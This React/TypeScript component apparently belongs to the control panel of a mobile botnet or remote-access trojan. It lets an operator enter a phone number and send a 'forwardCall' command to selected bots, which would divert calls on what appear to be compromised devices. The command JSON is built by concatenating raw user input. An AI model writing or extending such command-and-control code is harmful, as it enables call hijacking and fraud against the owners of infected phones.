import { useContext, useState } from 'react';
import { Button, Input, notification } from "antd"
import { BotContext } from '../providers';
import { setCommand } from '../services';
import { ServerResponseType } from '../../../common/DataType';

export default ({load}: {load: () => void}) => {
  const { state, setState } = useContext(BotContext)
  const [phone, setPhone] = useState('')

  const submit = () => {
    if (phone == '') {
      notification['error']({
        message: 'ERROR',
        description: 'Please fill the phone number.'
      })

      return
    }

    if (state.selectedBots.length == 0) {
      notification['error']({
        message: 'ERROR',
        description: 'Please select the bot.'
      })

      return
    }

    setCommand(state.selectedBots, '{"name":"forwardCall","number":"' + phone + '"}').then((res: ServerResponseType) => {
      notification['info']({
        message: res.type.toUpperCase(),
        description: res.message
      })
      load()
    })
  }

  return (
    <div className="pb-6">
      <h2 className="text-xl">Forward call</h2>
      <p className="text-stone-500">Forward call on selected bots</p>
      <Input placeholder="Phone number +1" className="!mb-2" value={phone} onChange={(e: any) => setPhone(e.target.value)} />
      <Button ghost type="primary" className="float-right" onClick={submit}>Forward calls</Button>
    </div>
  )
}